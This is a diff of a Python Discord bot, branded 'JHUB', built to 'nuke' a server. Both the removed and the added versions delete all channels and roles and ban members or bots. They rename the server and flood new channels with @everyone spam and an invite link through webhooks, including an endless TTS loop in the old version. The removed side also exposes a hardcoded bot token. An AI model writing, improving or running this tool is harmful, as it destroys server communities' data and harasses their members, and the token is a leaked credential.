@@ -1,90 +1,80 @@
-from discord.ext import commands
 import discord
+from discord.ext import commands
+import os
 import asyncio
 
-# Settings
+# Configuration
 prefix = "!"
 channel_name = "nuked-by-jhub"
-role_name = "nuked-by-jhub"
-server_name = "NUKED BY JHUB"
-webhook_name = "JHUB Nuker"
-message = "💥 NUKED BY JHUB discord.gg/k7dfvnK7KK"
-token = "MTQwNDI5ODE0NTM3ODIwOTc5Mg.GM173H.vRdPonQwpKPlT02quUtetEw9_ZhHN4NXZ31epM" 
+webhook_name = "JHUB ON TOP"
+webhook_pfp = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
+spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
+guild_name = "JHUB ON TOP"
+guild_icon = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
 
-bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
+# Bot setup
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix=prefix, intents=intents)
 
-@bot.event 
+# Events
+@bot.event
 async def on_ready():
-    print("Bot is ready.")
+    print(f"{bot.user} is online and ready.")
 
 @bot.command()
 async def nuke(ctx):
     await ctx.message.delete()
-    tasks = []
-
-    # Ban all bots (except this one)
-    tasks.extend([member.ban(reason="Nuked by JHUB") for member in ctx.guild.members if member.bot and member != ctx.guild.me])
-
-    # Delete all roles (except @everyone and top role)
-    tasks.extend([role.delete() for role in ctx.guild.roles if role != ctx.guild.default_role and role != ctx.guild.me.top_role])
-
-    # Delete emojis & stickers
-    tasks.extend([emoji.delete() for emoji in ctx.guild.emojis])
-    tasks.extend([sticker.delete() for sticker in ctx.guild.stickers])
-
-    # Delete templates
-    if ctx.guild.templates:
-        templates = await ctx.guild.templates()
-        tasks.extend([template.delete() for template in templates])
-
-    # Delete all channels
-    tasks.extend([channel.delete() for channel in ctx.guild.channels])
-
-    try:
-        await asyncio.gather(*tasks)
-    except Exception as e:
-        print(f"Error during nuking: {e}")
-
-    # Create 500 channels and roles
-    create_tasks = []
-    for _ in range(500):
-        create_tasks.append(ctx.guild.create_text_channel(channel_name))
-        create_tasks.append(ctx.guild.create_role(name=role_name))
-    await asyncio.gather(*create_tasks)
-
-@bot.command() 
-async def check(ctx):
     guild = ctx.guild
 
-    if guild:
-        bot_member = guild.me
-        if bot_member.guild_permissions.administrator:
-            await ctx.send("✅ Bot has administrator permissions.")
-        else:
-            await ctx.send("❌ Bot does not have administrator permissions.")
-    else:
-        await ctx.send("This command can only be used in a server.")
-
-@bot.event
-async def on_guild_channel_create(channel):
-    if channel.name == channel_name:
+    # Delete channels
+    for channel in guild.channels:
         try:
-            # Rename server
-            await channel.guild.edit(name=server_name)
+            await channel.delete()
+        except:
+            pass
 
-            # Create webhook
+    # Delete roles
+    for role in guild.roles:
+        try:
+            await role.delete()
+        except:
+            pass
+
+    # Ban members
+    for member in guild.members:
+        try:
+            await member.ban(reason="Nuked by JHUB")
+        except:
+            pass
+
+    # Rename server and change icon
+    try:
+        with open("icon.gif", "wb") as f:
+            f.write(await (await bot.session.get(guild_icon)).read())
+        with open("icon.gif", "rb") as f:
+            await guild.edit(name=guild_name, icon=f.read())
+    except:
+        pass
+
+    # Create new channels with spam
+    for _ in range(50):
+        try:
+            channel = await guild.create_text_channel(channel_name)
             webhook = await channel.create_webhook(name=webhook_name)
+            for _ in range(20):
+                try:
+                    await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
+                except:
+                    pass
+        except:
+            pass
 
-            while True:
-                tasks = []
-                for _ in range(10):
-                    tasks.append(channel.send(f"@everyone @here\n{message}", tts=True))
-                    tasks.append(webhook.send(f"@everyone @here\n{message}", tts=True))
-                await asyncio.gather(*tasks)
+# Safe token loading
+if __name__ == "__main__":
+    token = os.getenv("DISCORD_TOKEN")
+    if not token:
+        print("Error: DISCORD_TOKEN environment variable not found.")
+        exit(1)
+    bot.run(token)
 
-        except discord.errors.Forbidden:
-            print(f"Missing permissions in channel: {channel.name}")
-        except Exception as e:
-            print(f"Error in on_guild_channel_create: {e}")
 
-bot.run(token)
